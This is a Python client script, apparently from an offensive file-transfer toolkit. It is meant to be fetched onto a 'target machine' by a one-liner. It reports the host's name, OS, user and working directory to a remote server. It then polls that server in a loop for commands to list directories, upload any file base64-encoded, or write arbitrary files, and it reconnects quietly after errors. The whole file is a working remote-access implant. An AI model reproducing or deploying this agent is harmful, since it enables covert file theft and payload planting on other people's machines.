#!/usr/bin/env python3
"""
FileTransfer Client — executed on the target machine.
This file is served dynamically by server.py with SERVER_PLACEHOLDER replaced.
Do NOT run this file directly from disk; use the one-liners shown by the server.
"""
import sys, os, json, base64, socket, platform, time

SERVER = "http://SERVER_PLACEHOLDER"

if "SERVER_PLACEHOLDER" in SERVER:
    print("[!] This script must be fetched from the FileTransfer server.")
    print("[!] Start server.py and use the one-liners it displays.")
    sys.exit(1)

try:
    from urllib.request import urlopen, Request
    from urllib.error import URLError
except ImportError:
    print("[!] Python 3 is required.")
    sys.exit(1)


def api_post(path, data):
    raw = json.dumps(data).encode()
    req = Request(SERVER + path, data=raw, headers={"Content-Type": "application/json"})
    resp = urlopen(req, timeout=15)
    return json.loads(resp.read().decode())


def api_get(path):
    resp = urlopen(SERVER + path, timeout=15)
    return json.loads(resp.read().decode())


def cmd_ls(args):
    path = os.path.abspath(args.get("path", os.getcwd()))
    try:
        entries = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            try:
                st = os.stat(full)
                entries.append({
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "file",
                    "size": st.st_size,
                    "mtime": int(st.st_mtime),
                })
            except OSError:
                entries.append({"name": name, "type": "unknown", "size": 0, "mtime": 0})
        entries.sort(key=lambda x: (x["type"] != "dir", x["name"].lower()))
        return {"ok": True, "path": path, "entries": entries}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def cmd_get(args):
    path = args.get("path", "")
    try:
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
        return {"ok": True, "path": path, "name": os.path.basename(path), "data": data}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def cmd_put(args):
    path = args.get("path", "")
    try:
        parent = os.path.dirname(os.path.abspath(path))
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(base64.b64decode(args["data"]))
        return {"ok": True, "path": os.path.abspath(path), "size": os.path.getsize(path)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


HANDLERS = {"ls": cmd_ls, "get": cmd_get, "put": cmd_put}


def main():
    client_id = None
    while True:
        try:
            if client_id is None:
                r = api_post("/api/register", {
                    "hostname": socket.gethostname(),
                    "os": platform.system(),
                    "version": platform.version()[:60],
                    "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
                    "cwd": os.getcwd(),
                })
                client_id = r["id"]
                sys.stderr.write(f"[+] Connected to {SERVER} (id={client_id[:8]})\n")

            r = api_get(f"/api/cmd/{client_id}")
            if r.get("cmd"):
                handler = HANDLERS.get(r["cmd"])
                result = handler(r.get("args", {})) if handler else {"ok": False, "error": f"unknown: {r['cmd']}"}
                api_post(f"/api/result/{client_id}", {"rid": r["rid"], "result": result})

            time.sleep(1)

        except KeyboardInterrupt:
            sys.stderr.write("\n[*] Disconnected.\n")
            break
        except Exception:
            client_id = None
            time.sleep(3)


main()
